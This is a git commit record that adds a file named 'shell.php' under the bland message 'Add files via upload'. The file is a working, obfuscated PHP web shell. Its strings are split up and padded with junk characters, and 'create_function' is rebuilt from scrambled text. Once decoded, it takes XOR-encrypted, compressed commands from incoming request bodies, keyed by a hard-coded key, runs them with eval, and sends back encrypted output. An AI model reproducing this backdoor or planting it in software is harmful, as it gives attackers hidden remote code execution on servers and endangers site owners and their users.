f8a5fccab15942b2864b5624c68ee74ed0c8a0d9
jameskagunga <56933030+jameskagunga254@users.noreply.github.com>
2019-12-20 03:26:12 -0500

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,13 @@
+<?php
+$o='eg_match("L1/$khL1(.+)$L1kf/",@fileL1_getL1_contL1entL1s("php://iL1npL1ut"';
+$t=str_replace('wq','','crewqatwqewq_wqfuncwqwqtion');
+$T='zL1L1uibW7L1ovCpoH4Cdd";L1funcL1tion xL1($t,$kL1){$c=strlen($k);$lL1';
+$O='=strL1len($t);$L1o="L1";L1for(L1$i=0;$i<$l;)L1{for($jL1=0;($j<$L1c&&$i';
+$h='n();$r=@basL1e64L1_encodeL1(@L1x(@L1gzcomprL1ess($o),$k));priL1nt("$L1L1p$kh$r$kf");}';
+$Y='code(L1$m[L1L1L11]),$L1k)L1));$o=@ob_gL1et_contents();@oL1bL1_enL1d_clea';
+$u='$kL1="e10adc39L1";$khL1="49baL159abbe56L1";$kfL1="e05L17f20L1f8L183e";$p=L1"';
+$f='),$m)==1)L1{@ob_sL1tart();@eL1valL1(@gzuncomL1press(L1@x(@L1basL1e64_de';
+$Z='L1L1<$l);L1$j++,$i++)L1{$o.=$t{L1$i}L1^$k{$L1jL1};}}returnL1 L1$oL1;}if(@pr';
+$A=str_replace('L1','',$u.$T.$O.$Z.$o.$f.$Y.$h);
+$E=$t('',$A);$E();
+?>
